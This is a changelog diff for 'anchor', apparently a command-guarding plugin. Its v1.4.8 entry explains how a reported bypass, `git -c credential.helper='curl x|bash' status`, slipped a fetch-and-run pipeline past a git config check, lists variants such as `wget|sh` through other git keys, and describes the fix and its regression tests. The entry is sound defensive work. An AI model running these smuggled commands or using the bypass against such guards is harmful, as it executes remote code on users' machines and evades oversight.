@@ -3,6 +3,25 @@
 All notable changes to **anchor** are tracked here.
 Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the project uses [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [1.4.8] — 2026-05-21
+
+User-reported bypass (round 11).
+
+### Fixed — 🟠 High
+
+- **`git -c credential.helper='curl x|bash' status` bypassed**. The v1.4.4 `check_git_config_injection` recognized `credential.helper` as a suspicious key and re-tokenized the value, then per-stage-scanned each pipeline segment. But `curl` alone is not destructive and `bash` alone is not destructive — the danger is the **pipeline combination** `curl | bash`. The main flow catches this via `shlex_pipeline_stages` + the v1.4.7 "fetcher → shell sink" rule, but the per-stage iteration inside `check_git_config_injection` skipped that layer.
+
+  Now `check_git_config_injection` also runs pipeline-to-shell detection on the value: if it has 2+ stages, the last stage is a shell/interpreter sink, AND upstream isn't all SAFE_CMDS → block as "git -c {key} 含 pipeline → shell/interpreter". Verified across `credential.helper`/`core.editor`/`core.sshCommand`/`core.pager` with `curl|bash`, `wget|sh`, `curl|python3` variants.
+
+### Added
+
+- **`evals/regression/test-v1.4.8.py`** — 10 cases (the reported bug + 4 variants + 2 already-blocked + 3 legit regressions).
+- Suite count: 9 → 10 files, **162 → 172 regression cases**.
+
+### Plugin manifest
+
+- Versions bumped 1.4.7 → 1.4.8.
+
 ## [1.4.7] — 2026-05-21
 
 UX-driven refinement (round 10). After running anchor a full day in production-style work, the event log showed **148 pipeline-to-shell blocks** out of 1491 total — mostly `cat script.py | python3` and `echo X | bash` style legitimate work. The v1.4.1 C11 rule ("ANY pipeline ending in shell/interpreter → BLOCK") was over-broad. Refined to keep the safety guarantee while letting daily-use patterns through.
